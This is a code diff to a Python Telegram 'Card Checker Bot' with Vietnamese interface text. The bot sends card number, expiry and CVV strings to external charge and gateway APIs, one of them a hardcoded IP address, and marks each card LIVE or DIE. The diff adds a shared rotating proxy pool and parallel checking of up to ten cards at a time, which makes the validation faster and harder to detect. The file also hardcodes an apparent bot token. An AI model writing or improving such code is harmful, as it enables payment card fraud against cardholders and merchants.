@@ -3,6 +3,8 @@ import json
 import time
 import threading
 import random
+import os
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 # ==================== CONFIGURATION ====================
 BOT_TOKEN = "7326105005:AAHwps79h6NTVYzDBTrCdG8JoIdz39Gz_AA"
@@ -30,6 +32,91 @@ user_settings = {}
 
 # Bot running state - admin can stop/start processing
 bot_running = True
+
+# ==================== GLOBAL PROXY POOL ====================
+# Proxy pool is shared by ALL users and saved permanently to proxies.txt
+# Format per line: host:port:user:pass  OR  host:port  OR  http://user:pass@host:port
+PROXY_POOL_FILE = "proxies.txt"
+_proxy_pool = []          # list of proxy strings
+_proxy_pool_lock = threading.Lock()
+_proxy_index = 0          # round-robin index
+
+def load_proxy_pool():
+    """Load proxy pool from proxies.txt into memory"""
+    global _proxy_pool
+    proxies = []
+    if os.path.exists(PROXY_POOL_FILE):
+        try:
+            with open(PROXY_POOL_FILE, "r", encoding="utf-8") as f:
+                for line in f:
+                    line = line.strip()
+                    if line and not line.startswith("#"):
+                        proxies.append(line)
+        except Exception as e:
+            print(f"[WARN] Could not load proxy pool: {e}")
+    with _proxy_pool_lock:
+        _proxy_pool = proxies
+    print(f"[OK] Proxy pool loaded: {len(_proxy_pool)} proxies")
+
+def save_proxy_pool():
+    """Save current proxy pool to proxies.txt"""
+    with _proxy_pool_lock:
+        proxies = list(_proxy_pool)
+    try:
+        with open(PROXY_POOL_FILE, "w", encoding="utf-8") as f:
+            for p in proxies:
+                f.write(p + "\n")
+    except Exception as e:
+        print(f"[WARN] Could not save proxy pool: {e}")
+
+def get_proxy_pool():
+    """Return a copy of the current proxy pool"""
+    with _proxy_pool_lock:
+        return list(_proxy_pool)
+
+def add_proxies_to_pool(proxy_list):
+    """Add new proxies to pool (skip duplicates), save to file"""
+    global _proxy_pool
+    added = 0
+    with _proxy_pool_lock:
+        existing = set(_proxy_pool)
+        for p in proxy_list:
+            p = p.strip()
+            if p and p not in existing:
+                _proxy_pool.append(p)
+                existing.add(p)
+                added += 1
+    if added > 0:
+        save_proxy_pool()
+    return added
+
+def remove_proxy_from_pool(index_1based):
+    """Remove proxy by 1-based index, save to file. Returns removed proxy or None."""
+    global _proxy_pool
+    with _proxy_pool_lock:
+        idx = index_1based - 1
+        if idx < 0 or idx >= len(_proxy_pool):
+            return None
+        removed = _proxy_pool.pop(idx)
+    save_proxy_pool()
+    return removed
+
+def clear_proxy_pool():
+    """Clear all proxies from pool"""
+    global _proxy_pool
+    with _proxy_pool_lock:
+        _proxy_pool = []
+    save_proxy_pool()
+
+def get_next_proxy():
+    """Get next proxy from pool using round-robin. Returns None if pool is empty."""
+    global _proxy_index
+    with _proxy_pool_lock:
+        if not _proxy_pool:
+            return None
+        proxy = _proxy_pool[_proxy_index % len(_proxy_pool)]
+        _proxy_index = (_proxy_index + 1) % len(_proxy_pool)
+        return proxy
 
 def is_admin(user_id):
     """Check if user is admin"""
@@ -186,8 +273,16 @@ def parse_card_input(line):
 # ==================== API CHECK ====================
 
 def check_card(card_format, site, proxy):
-    """Call API to check card via charge.py API (152.42.163.248)"""
-    full_url = f"{API_ENDPOINT}?site={site}&card={card_format}&proxy={proxy}"
+    """Call API to check card via charge.py API (152.42.163.248).
+    
+    If global proxy pool has proxies, pick one via round-robin (ignoring per-user proxy).
+    Otherwise fall back to the provided per-user proxy.
+    """
+    # Use proxy pool if available, otherwise use per-user proxy
+    pool_proxy = get_next_proxy()
+    effective_proxy = pool_proxy if pool_proxy else proxy
+
+    full_url = f"{API_ENDPOINT}?site={site}&card={card_format}&proxy={effective_proxy}"
 
     try:
         response = requests.get(full_url, timeout=120)
@@ -285,6 +380,8 @@ def get_settings(user_id):
 
 def handle_start(chat_id, user_msg_id):
     """Handle /start command"""
+    pool_size = len(get_proxy_pool())
+    pool_info = f"✅ {pool_size} proxies (parallel)" if pool_size > 0 else "⚠️ Empty (sequential)"
     text = (
         "🔥 <b>Card Checker Bot</b>\n"
         "━━━━━━━━━━━━━━━━━━━━━━\n\n"
@@ -310,7 +407,7 @@ def handle_start(chat_id, user_msg_id):
         "⚙️ <b>SETTINGS</b>\n"
         "<code>/settings</code>  — Xem cài đặt hiện tại\n"
         "<code>/setsite URL</code>  — Đổi site\n"
-        "<code>/setproxy host:port:user:pass</code>  — Đổi proxy\n"
+        "<code>/setproxy host:port:user:pass</code>  — Đổi proxy cá nhân\n"
         "<code>/resetsite</code>  /  <code>/resetproxy</code>  — Reset về mặc định\n"
         "<code>/listsite</code>  — Danh sách site khả dụng\n\n"
 
@@ -331,8 +428,16 @@ def handle_start(chat_id, user_msg_id):
         "<code>/areset ID</code>  — Reset settings của user\n"
         "<code>/listusers</code>  — Danh sách users\n\n"
 
+        "🔀 <b>PROXY POOL (ADMIN)</b>\n"
+        f"<code>/proxystatus</code>  — Trạng thái pool ({pool_info})\n"
+        "<code>/addproxy proxy</code>  — Thêm proxy vào pool (lưu vĩnh viễn)\n"
+        "<code>/listproxies</code>  — Xem danh sách proxy trong pool\n"
+        "<code>/delproxy [n]</code>  — Xóa proxy theo số thứ tự\n"
+        "<code>/clearproxies</code>  — Xóa toàn bộ proxy pool\n\n"
+
         "━━━━━━━━━━━━━━━━━━━━━━\n"
         "📌 Format: <code>số_thẻ|mm|yyyy|cvv</code>\n"
+        "⚡ Proxy pool → check song song (nhanh hơn)\n"
         "🗑️ Kết quả tự xóa sau 2 phút"
     )
     msg_id = send_message(chat_id, text)
@@ -343,14 +448,23 @@ def handle_settings(chat_id, user_id, user_msg_id):
     """Handle /settings command"""
     site, proxy = get_settings(user_id)
     proxy_display = proxy[:50] + "..." if len(proxy) > 50 else proxy
+    pool = get_proxy_pool()
+    pool_size = len(pool)
+    max_workers = max(1, min(pool_size, 10)) if pool_size > 0 else 1
+    if pool_size > 0:
+        pool_status = f"✅ {pool_size} proxies → parallel x{max_workers} (overrides personal proxy)"
+    else:
+        pool_status = f"⚠️ Empty → using personal proxy below (sequential)"
     text = (
         "⚙️ <b>Your Settings</b>\n"
         "━━━━━━━━━━━━━━━━━━━━━━\n\n"
         f"🌐 <b>Site:</b>\n<code>{site}</code>\n\n"
-        f"🔒 <b>Proxy:</b>\n<code>{proxy_display}</code>\n\n"
+        f"🔒 <b>Personal Proxy:</b>\n<code>{proxy_display}</code>\n\n"
+        f"🔀 <b>Global Proxy Pool:</b>\n{pool_status}\n\n"
         "━━━━━━━━━━━━━━━━━━━━━━\n"
-        "Use /setsite or /setproxy to change\n"
-        "⚠️ Settings are personal, won't affect others."
+        "Use /setsite or /setproxy to change personal settings\n"
+        "⚠️ Personal settings won't affect others.\n"
+        "💡 Global proxy pool is managed by admin (/proxystatus)"
     )
     msg_id = send_message(chat_id, text)
     schedule_delete_multiple(chat_id, [user_msg_id, msg_id])
@@ -476,7 +590,7 @@ def handle_listsite(chat_id, user_id, text, user_msg_id):
     schedule_delete_multiple(chat_id, msg_ids_to_delete)
 
 def handle_chg(chat_id, user_id, text, user_name, user_msg_id):
-    """Handle /chg command - check cards"""
+    """Handle /chg command - check cards (parallel if proxy pool available)"""
     # Collect all message IDs to delete later
     msg_ids_to_delete = [user_msg_id]
 
@@ -527,12 +641,19 @@ def handle_chg(chat_id, user_id, text, user_name, user_msg_id):
     # Get THIS USER's settings (not chat-wide)
     site, proxy = get_settings(user_id)
 
+    # Determine concurrency: use proxy pool size (min 1, max 10 workers)
+    pool_size = len(get_proxy_pool())
+    max_workers = max(1, min(pool_size, 10)) if pool_size > 0 else 1
+    parallel = max_workers > 1
+
     # Send initial status message
     total = len(parsed_cards)
+    proxy_info = f"🔀 Proxies: {pool_size} (parallel x{max_workers})" if parallel else "🔒 Proxy: single (sequential)"
     status_text = (
         f"🔄 <b>Checking {total} card(s)...</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n"
         f"👤 User: {user_name}\n"
+        f"{proxy_info}\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
         f"⏳ Processing..."
     )
@@ -543,75 +664,123 @@ def handle_chg(chat_id, user_id, text, user_name, user_msg_id):
     status_msg_id = send_message(chat_id, status_text)
     msg_ids_to_delete.append(status_msg_id)
 
-    # Check each card
-    results_text = []
+    # ---- Parallel or sequential checking ----
+    # results_map: index -> result_line (to preserve order)
+    results_map = {}
     live_count = 0
     die_count = 0
+    completed = 0
+    results_lock = threading.Lock()
     start_time = time.time()
 
-    for i, card_data in enumerate(parsed_cards, 1):
+    def _check_one(idx, card_data):
         card_format = card_data['check_format']
         extra_info = card_data['extra_info']
-
-        # Call API
         response_text = check_card(card_format, site, proxy)
         data = parse_response(response_text)
-
         price = data.get('price', 'N/A')
         response = data.get('response', 'N/A')
         order_url = data.get('order_url', '')
         gate = data.get('gate', '')
 
-        # Determine LIVE/DIE/SITE_ERROR
         if is_live(response, order_url):
-            status = "LIVE"
+            status_label = "LIVE"
             emoji = "✅"
-            live_count += 1
+            is_live_card = True
         elif is_site_error(response):
-            status = "SITE_ERR"
+            status_label = "SITE_ERR"
             emoji = "⚠️"
-            die_count += 1
+            is_live_card = False
         else:
-            status = "DIE"
+            status_label = "DIE"
             emoji = "❌"
-            die_count += 1
+            is_live_card = False
 
-        # Build result line
-        result_line = f"{emoji} <code>{card_format}</code> | {price} | {response} | {status}"
-
+        result_line = f"{emoji} <code>{card_format}</code> | {price} | {response} | {status_label}"
         if extra_info:
             result_line += f" | {extra_info}"
-
-        if status == "LIVE" and order_url:
+        if status_label == "LIVE" and order_url:
             result_line += f"\n   📦 <a href='{order_url}'>Order URL</a>"
-
         if gate:
             result_line += f" | {gate}"
 
-        results_text.append(result_line)
+        return idx, result_line, is_live_card, status_label
 
-        # Update status message
-        update_interval = 1 if total <= 10 else 3
-        if status_msg_id and (i % update_interval == 0 or i == total):
-            elapsed = int(time.time() - start_time)
-            progress_text = (
-                f"🔄 <b>Checking {total} card(s)...</b>\n"
-                f"━━━━━━━━━━━━━━━━━━━━━━\n"
-                f"👤 User: {user_name}\n"
-                f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
-                f"📊 Progress: {i}/{total}\n"
-                f"✅ Live: {live_count} | ❌ Die: {die_count}\n"
-                f"⏱️ Elapsed: {elapsed}s\n\n"
-            )
-            progress_text += "\n".join(results_text[-5:])
-            if i < total:
-                progress_text += f"\n\n⏳ Checking next card..."
+    if parallel:
+        with ThreadPoolExecutor(max_workers=max_workers) as executor:
+            futures = {
+                executor.submit(_check_one, i, card_data): i
+                for i, card_data in enumerate(parsed_cards)
+            }
+            for future in as_completed(futures):
+                try:
+                    idx, result_line, is_live_card, status_label = future.result()
+                except Exception as exc:
+                    idx = futures[future]
+                    result_line = f"❌ <code>ERROR</code> | {exc}"
+                    is_live_card = False
 
-            edit_message(chat_id, status_msg_id, progress_text)
+                with results_lock:
+                    results_map[idx] = result_line
+                    if is_live_card:
+                        live_count += 1
+                    else:
+                        die_count += 1
+                    completed += 1
+                    done = completed
 
-        # Delay between requests
-        if i < total:
-            time.sleep(15)
+                # Update progress
+                if status_msg_id and (done % 3 == 0 or done == total):
+                    elapsed = int(time.time() - start_time)
+                    recent = [results_map[k] for k in sorted(results_map)[-5:]]
+                    progress_text = (
+                        f"🔄 <b>Checking {total} card(s)...</b>\n"
+                        f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                        f"👤 User: {user_name}\n"
+                        f"🔀 Parallel x{max_workers} | {pool_size} proxies\n"
+                        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                        f"📊 Progress: {done}/{total}\n"
+                        f"✅ Live: {live_count} | ❌ Die: {die_count}\n"
+                        f"⏱️ Elapsed: {elapsed}s\n\n"
+                    )
+                    progress_text += "\n".join(recent)
+                    if done < total:
+                        progress_text += f"\n\n⏳ Checking remaining {total - done} card(s)..."
+                    edit_message(chat_id, status_msg_id, progress_text)
+    else:
+        # Sequential (no proxy pool)
+        for i, card_data in enumerate(parsed_cards):
+            idx, result_line, is_live_card, status_label = _check_one(i, card_data)
+            results_map[idx] = result_line
+            if is_live_card:
+                live_count += 1
+            else:
+                die_count += 1
+            completed += 1
+
+            update_interval = 1 if total <= 10 else 3
+            if status_msg_id and (completed % update_interval == 0 or completed == total):
+                elapsed = int(time.time() - start_time)
+                recent = [results_map[k] for k in sorted(results_map)[-5:]]
+                progress_text = (
+                    f"🔄 <b>Checking {total} card(s)...</b>\n"
+                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                    f"👤 User: {user_name}\n"
+                    f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                    f"📊 Progress: {completed}/{total}\n"
+                    f"✅ Live: {live_count} | ❌ Die: {die_count}\n"
+                    f"⏱️ Elapsed: {elapsed}s\n\n"
+                )
+                progress_text += "\n".join(recent)
+                if completed < total:
+                    progress_text += f"\n\n⏳ Checking next card..."
+                edit_message(chat_id, status_msg_id, progress_text)
+
+            if completed < total:
+                time.sleep(15)
+
+    # Build ordered results list
+    results_text = [results_map[k] for k in sorted(results_map)]
 
     # Final summary
     elapsed = int(time.time() - start_time)
@@ -629,8 +798,10 @@ def handle_chg(chat_id, user_id, text, user_name, user_msg_id):
         f"📋 Total: {total} | ✅ Live: {live_count} | ❌ Die: {die_count}\n"
         f"⏱️ Time: {mins}m {secs}s\n"
         f"🌐 Site: <code>{site}</code>\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
     )
+    if parallel:
+        final_text += f"🔀 Parallel x{max_workers} ({pool_size} proxies)\n"
+    final_text += f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
 
     if all_site_errors or site_error_count > 0:
         final_text += (
@@ -645,7 +816,7 @@ def handle_chg(chat_id, user_id, text, user_name, user_msg_id):
             f"✅ <b>Cách fix:</b>\n"
             f"  • Dùng <code>/listsite</code> để xem danh sách site khác\n"
             f"  • Dùng <code>/setsite URL</code> để đổi sang site khác\n"
-            f"  • Dùng <code>/setproxy</code> để đổi proxy\n"
+            f"  • Dùng <code>/addproxy</code> để thêm proxy vào pool\n"
             f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
         )
 
@@ -950,8 +1121,16 @@ def extract_cards_from_text(text, max_cards=20):
     return result
 
 def check_card_gateway(card_format, api_url):
-    """Call a gateway API (pp or b3) and return parsed result dict"""
-    url = api_url + card_format
+    """Call a gateway API (pp or b3) and return parsed result dict.
+    
+    If global proxy pool has proxies, append proxy param to URL via round-robin.
+    """
+    # Use proxy pool if available
+    pool_proxy = get_next_proxy()
+    if pool_proxy:
+        url = api_url + card_format + f"&proxy={pool_proxy}"
+    else:
+        url = api_url + card_format
     try:
         response = requests.get(url, timeout=60)
         raw = response.text.strip()
@@ -992,7 +1171,7 @@ def _gateway_status_emoji(status):
     return "⚠️", "UNKNOWN"
 
 def handle_gateway_check(chat_id, user_id, text, user_name, user_msg_id, gateway):
-    """Generic handler for /pp and /b3 commands.
+    """Generic handler for /pp and /b3 commands (parallel if proxy pool available).
     
     gateway: 'pp' or 'b3'
     """
@@ -1029,36 +1208,38 @@ def handle_gateway_check(chat_id, user_id, text, user_name, user_msg_id, gateway
         return
     
     total = len(cards)
+
+    # Determine concurrency from proxy pool
+    pool_size = len(get_proxy_pool())
+    max_workers = max(1, min(pool_size, 10)) if pool_size > 0 else 1
+    parallel = max_workers > 1
+
+    proxy_info = f"🔀 Proxies: {pool_size} (parallel x{max_workers})" if parallel else "🔒 Single proxy (sequential)"
+
     status_msg_id = send_message(chat_id,
         f"{gate_emoji} <b>{gate_name} Checker</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n"
         f"👤 User: {user_name}\n"
         f"📋 Cards: {total}\n"
+        f"{proxy_info}\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
         f"⏳ Processing..."
     )
     msg_ids_to_delete.append(status_msg_id)
     
-    results_text = []
+    results_map = {}
     live_count = 0
     die_count = 0
+    completed = 0
+    results_lock = threading.Lock()
     start_time = time.time()
-    
-    for i, card_format in enumerate(cards, 1):
+
+    def _check_gw_one(idx, card_format):
         data = check_card_gateway(card_format, api_url)
-        
         status_val = data.get("status", "UNKNOWN")
         resp_val   = data.get("response", "")
         extra_val  = data.get("extra", "")
-        
         emoji, label = _gateway_status_emoji(status_val)
-        
-        if label == "LIVE":
-            live_count += 1
-        else:
-            die_count += 1
-        
-        # Build clean result line
         result_line = (
             f"{emoji} <code>{card_format}</code>\n"
             f"   ├ Status: <b>{status_val}</b>\n"
@@ -1066,29 +1247,80 @@ def handle_gateway_check(chat_id, user_id, text, user_name, user_msg_id, gateway
         )
         if extra_val:
             result_line += f"\n   └ Extra: {extra_val}"
-        
-        results_text.append(result_line)
-        
-        # Update progress message
-        update_interval = 1 if total <= 10 else 3
-        if status_msg_id and (i % update_interval == 0 or i == total):
-            elapsed = int(time.time() - start_time)
-            progress_text = (
-                f"{gate_emoji} <b>{gate_name} Checker</b>\n"
-                f"━━━━━━━━━━━━━━━━━━━━━━\n"
-                f"👤 User: {user_name}\n"
-                f"📊 Progress: {i}/{total} | ✅ {live_count} | ❌ {die_count}\n"
-                f"⏱️ Elapsed: {elapsed}s\n"
-                f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
-            )
-            progress_text += "\n\n".join(results_text[-5:])
-            if i < total:
-                progress_text += f"\n\n⏳ Checking next..."
-            edit_message(chat_id, status_msg_id, progress_text)
-        
-        if i < total:
-            time.sleep(2)
-    
+        return idx, result_line, label == "LIVE"
+
+    if parallel:
+        with ThreadPoolExecutor(max_workers=max_workers) as executor:
+            futures = {
+                executor.submit(_check_gw_one, i, card_format): i
+                for i, card_format in enumerate(cards)
+            }
+            for future in as_completed(futures):
+                try:
+                    idx, result_line, is_live_card = future.result()
+                except Exception as exc:
+                    idx = futures[future]
+                    result_line = f"❌ <code>ERROR</code> | {exc}"
+                    is_live_card = False
+
+                with results_lock:
+                    results_map[idx] = result_line
+                    if is_live_card:
+                        live_count += 1
+                    else:
+                        die_count += 1
+                    completed += 1
+                    done = completed
+
+                if status_msg_id and (done % 3 == 0 or done == total):
+                    elapsed = int(time.time() - start_time)
+                    recent = [results_map[k] for k in sorted(results_map)[-5:]]
+                    progress_text = (
+                        f"{gate_emoji} <b>{gate_name} Checker</b>\n"
+                        f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                        f"👤 User: {user_name}\n"
+                        f"🔀 Parallel x{max_workers} | {pool_size} proxies\n"
+                        f"📊 Progress: {done}/{total} | ✅ {live_count} | ❌ {die_count}\n"
+                        f"⏱️ Elapsed: {elapsed}s\n"
+                        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                    )
+                    progress_text += "\n\n".join(recent)
+                    if done < total:
+                        progress_text += f"\n\n⏳ Checking remaining {total - done}..."
+                    edit_message(chat_id, status_msg_id, progress_text)
+    else:
+        for i, card_format in enumerate(cards):
+            idx, result_line, is_live_card = _check_gw_one(i, card_format)
+            results_map[idx] = result_line
+            if is_live_card:
+                live_count += 1
+            else:
+                die_count += 1
+            completed += 1
+
+            update_interval = 1 if total <= 10 else 3
+            if status_msg_id and (completed % update_interval == 0 or completed == total):
+                elapsed = int(time.time() - start_time)
+                recent = [results_map[k] for k in sorted(results_map)[-5:]]
+                progress_text = (
+                    f"{gate_emoji} <b>{gate_name} Checker</b>\n"
+                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                    f"👤 User: {user_name}\n"
+                    f"📊 Progress: {completed}/{total} | ✅ {live_count} | ❌ {die_count}\n"
+                    f"⏱️ Elapsed: {elapsed}s\n"
+                    f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                )
+                progress_text += "\n\n".join(recent)
+                if completed < total:
+                    progress_text += f"\n\n⏳ Checking next..."
+                edit_message(chat_id, status_msg_id, progress_text)
+
+            if completed < total:
+                time.sleep(2)
+
+    # Build ordered results
+    results_text = [results_map[k] for k in sorted(results_map)]
+
     # Final result
     elapsed = int(time.time() - start_time)
     mins = elapsed // 60
@@ -1100,8 +1332,10 @@ def handle_gateway_check(chat_id, user_id, text, user_name, user_msg_id, gateway
         f"👤 User: {user_name}\n"
         f"📋 Total: {total} | ✅ Live: {live_count} | ❌ Die: {die_count}\n"
         f"⏱️ Time: {mins}m {secs}s\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
     )
+    if parallel:
+        final_text += f"🔀 Parallel x{max_workers} ({pool_size} proxies)\n"
+    final_text += f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
     final_text += "\n\n".join(results_text)
     final_text += f"\n\n🗑️ <i>Auto-delete in {AUTO_DELETE_DELAY}s</i>"
     
@@ -1355,6 +1589,245 @@ def handle_admin_resetuser(chat_id, user_id, text, user_msg_id):
         del user_settings[target_id]
     
     msg_id = send_message(chat_id, f"✅ [ADMIN] User {target_id} settings reset to default!")
+    msg_ids_to_delete.append(msg_id)
+    schedule_delete_multiple(chat_id, msg_ids_to_delete)
+
+def handle_addproxy(chat_id, user_id, text, user_msg_id):
+    """Admin: /addproxy - add one or more proxies to global pool (permanent)
+    
+    Usage:
+        /addproxy host:port:user:pass
+        /addproxy
+        proxy1
+        proxy2
+        proxy3
+    """
+    msg_ids_to_delete = [user_msg_id]
+
+    if not is_admin(user_id):
+        msg_id = send_message(chat_id, "❌ Admin only!")
+        msg_ids_to_delete.append(msg_id)
+        schedule_delete_multiple(chat_id, msg_ids_to_delete)
+        return
+
+    # Collect proxy lines from message
+    lines = text.split('\n')
+    first_line_parts = lines[0].split(maxsplit=1)
+    proxy_lines = []
+    if len(first_line_parts) > 1:
+        proxy_lines.append(first_line_parts[1].strip())
+    for line in lines[1:]:
+        line = line.strip()
+        if line:
+            proxy_lines.append(line)
+
+    if not proxy_lines:
+        pool = get_proxy_pool()
+        msg_id = send_message(chat_id,
+            f"❌ Usage:\n"
+            f"<code>/addproxy host:port:user:pass</code>\n\n"
+            f"Or multiple proxies:\n"
+            f"<code>/addproxy\n"
+            f"host1:port:user:pass\n"
+            f"host2:port:user:pass</code>\n\n"
+            f"📋 Current pool: <b>{len(pool)}</b> proxies\n"
+            f"💡 Proxies are saved permanently and shared by ALL users."
+        )
+        msg_ids_to_delete.append(msg_id)
+        schedule_delete_multiple(chat_id, msg_ids_to_delete)
+        return
+
+    added = add_proxies_to_pool(proxy_lines)
+    pool = get_proxy_pool()
+
+    msg_id = send_message(chat_id,
+        f"✅ <b>Proxy Pool Updated!</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"➕ Added: <b>{added}</b> new proxy(ies)\n"
+        f"⏭️ Skipped (duplicate): <b>{len(proxy_lines) - added}</b>\n"
+        f"📋 Total pool size: <b>{len(pool)}</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"💾 Saved permanently to proxies.txt\n"
+        f"👥 Applied to ALL users automatically."
+    )
+    msg_ids_to_delete.append(msg_id)
+    schedule_delete_multiple(chat_id, msg_ids_to_delete)
+
+def handle_listproxies(chat_id, user_id, text, user_msg_id):
+    """Admin: /listproxies [page] - list all proxies in global pool"""
+    msg_ids_to_delete = [user_msg_id]
+
+    if not is_admin(user_id):
+        msg_id = send_message(chat_id, "❌ Admin only!")
+        msg_ids_to_delete.append(msg_id)
+        schedule_delete_multiple(chat_id, msg_ids_to_delete)
+        return
+
+    pool = get_proxy_pool()
+    if not pool:
+        msg_id = send_message(chat_id,
+            "📋 <b>Proxy Pool is EMPTY</b>\n\n"
+            "Use <code>/addproxy host:port:user:pass</code> to add proxies.\n"
+            "Proxies are shared by ALL users and saved permanently."
+        )
+        msg_ids_to_delete.append(msg_id)
+        schedule_delete_multiple(chat_id, msg_ids_to_delete)
+        return
+
+    # Parse page
+    parts = text.split(maxsplit=1)
+    page = 1
+    if len(parts) > 1:
+        try:
+            page = max(1, int(parts[1].strip()))
+        except ValueError:
+            page = 1
+
+    per_page = 15
+    total_pages = (len(pool) + per_page - 1) // per_page
+    page = min(page, total_pages)
+    start_idx = (page - 1) * per_page
+    end_idx = start_idx + per_page
+    page_proxies = pool[start_idx:end_idx]
+
+    text_out = (
+        f"🔒 <b>Global Proxy Pool</b> (Page {page}/{total_pages})\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"📋 Total: <b>{len(pool)}</b> proxies\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
+    )
+    for i, p in enumerate(page_proxies, start=start_idx + 1):
+        display = p[:60] + "..." if len(p) > 60 else p
+        text_out += f"{i}. <code>{display}</code>\n"
+
+    text_out += f"\n━━━━━━━━━━━━━━━━━━━━━━\n"
+    if total_pages > 1 and page < total_pages:
+        text_out += f"📄 Next page: <code>/listproxies {page + 1}</code>\n"
+    text_out += (
+        f"🗑️ Remove: <code>/delproxy [number]</code>\n"
+        f"🧹 Clear all: <code>/clearproxies</code>"
+    )
+
+    msg_id = send_message(chat_id, text_out)
+    msg_ids_to_delete.append(msg_id)
+    schedule_delete_multiple(chat_id, msg_ids_to_delete)
+
+def handle_delproxy(chat_id, user_id, text, user_msg_id):
+    """Admin: /delproxy [number] - remove proxy by index from pool"""
+    msg_ids_to_delete = [user_msg_id]
+
+    if not is_admin(user_id):
+        msg_id = send_message(chat_id, "❌ Admin only!")
+        msg_ids_to_delete.append(msg_id)
+        schedule_delete_multiple(chat_id, msg_ids_to_delete)
+        return
+
+    parts = text.split(maxsplit=1)
+    if len(parts) < 2:
+        pool = get_proxy_pool()
+        msg_id = send_message(chat_id,
+            f"❌ Usage: <code>/delproxy [number]</code>\n\n"
+            f"Use <code>/listproxies</code> to see proxy numbers.\n"
+            f"📋 Current pool: <b>{len(pool)}</b> proxies"
+        )
+        msg_ids_to_delete.append(msg_id)
+        schedule_delete_multiple(chat_id, msg_ids_to_delete)
+        return
+
+    try:
+        idx = int(parts[1].strip())
+    except ValueError:
+        msg_id = send_message(chat_id, "❌ Invalid number! Use: <code>/delproxy 1</code>")
+        msg_ids_to_delete.append(msg_id)
+        schedule_delete_multiple(chat_id, msg_ids_to_delete)
+        return
+
+    removed = remove_proxy_from_pool(idx)
+    if removed is None:
+        pool = get_proxy_pool()
+        msg_id = send_message(chat_id,
+            f"❌ Index out of range! Pool has <b>{len(pool)}</b> proxies.\n"
+            f"Use <code>/listproxies</code> to see valid numbers."
+        )
+        msg_ids_to_delete.append(msg_id)
+        schedule_delete_multiple(chat_id, msg_ids_to_delete)
+        return
+
+    pool = get_proxy_pool()
+    display = removed[:60] + "..." if len(removed) > 60 else removed
+    msg_id = send_message(chat_id,
+        f"✅ <b>Proxy Removed!</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"🗑️ Removed: <code>{display}</code>\n"
+        f"📋 Remaining: <b>{len(pool)}</b> proxies\n"
+        f"💾 Saved to proxies.txt"
+    )
+    msg_ids_to_delete.append(msg_id)
+    schedule_delete_multiple(chat_id, msg_ids_to_delete)
+
+def handle_clearproxies(chat_id, user_id, user_msg_id):
+    """Admin: /clearproxies - remove ALL proxies from global pool"""
+    msg_ids_to_delete = [user_msg_id]
+
+    if not is_admin(user_id):
+        msg_id = send_message(chat_id, "❌ Admin only!")
+        msg_ids_to_delete.append(msg_id)
+        schedule_delete_multiple(chat_id, msg_ids_to_delete)
+        return
+
+    old_count = len(get_proxy_pool())
+    clear_proxy_pool()
+
+    msg_id = send_message(chat_id,
+        f"🧹 <b>Proxy Pool Cleared!</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"🗑️ Removed: <b>{old_count}</b> proxies\n"
+        f"📋 Pool is now empty.\n"
+        f"💡 Bot will use per-user proxy (or DEFAULT_PROXY) until new proxies are added."
+    )
+    msg_ids_to_delete.append(msg_id)
+    schedule_delete_multiple(chat_id, msg_ids_to_delete)
+
+def handle_proxystatus(chat_id, user_id, user_msg_id):
+    """Admin: /proxystatus - show proxy pool status"""
+    msg_ids_to_delete = [user_msg_id]
+
+    if not is_admin(user_id):
+        msg_id = send_message(chat_id, "❌ Admin only!")
+        msg_ids_to_delete.append(msg_id)
+        schedule_delete_multiple(chat_id, msg_ids_to_delete)
+        return
+
+    pool = get_proxy_pool()
+    pool_size = len(pool)
+    max_workers = max(1, min(pool_size, 10)) if pool_size > 0 else 1
+
+    if pool_size == 0:
+        status_line = "⚠️ Pool EMPTY — using per-user / default proxy (sequential)"
+    else:
+        status_line = f"✅ Pool ACTIVE — parallel x{max_workers} workers"
+
+    default_display = DEFAULT_PROXY[:50] + "..." if len(DEFAULT_PROXY) > 50 else DEFAULT_PROXY
+
+    text = (
+        f"🔒 <b>Proxy Pool Status</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"📋 Pool size: <b>{pool_size}</b> proxies\n"
+        f"⚡ Workers: <b>{max_workers}</b> (parallel)\n"
+        f"📁 File: <code>proxies.txt</code>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"{status_line}\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"🔧 Default proxy (fallback):\n"
+        f"<code>{default_display}</code>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"📌 Commands:\n"
+        f"  <code>/addproxy</code> — Add proxies\n"
+        f"  <code>/listproxies</code> — List proxies\n"
+        f"  <code>/delproxy [n]</code> — Remove proxy\n"
+        f"  <code>/clearproxies</code> — Clear all"
+    )
+    msg_id = send_message(chat_id, text)
     msg_ids_to_delete.append(msg_id)
     schedule_delete_multiple(chat_id, msg_ids_to_delete)
 
@@ -1657,6 +2130,17 @@ def process_message(message):
         handle_admin_resetuser(chat_id, user_id, text, user_msg_id)
     elif text_lower.startswith("/listusers"):
         handle_listusers(chat_id, user_id, user_msg_id)
+    # Proxy pool commands (admin)
+    elif text_lower.startswith("/addproxy"):
+        handle_addproxy(chat_id, user_id, text, user_msg_id)
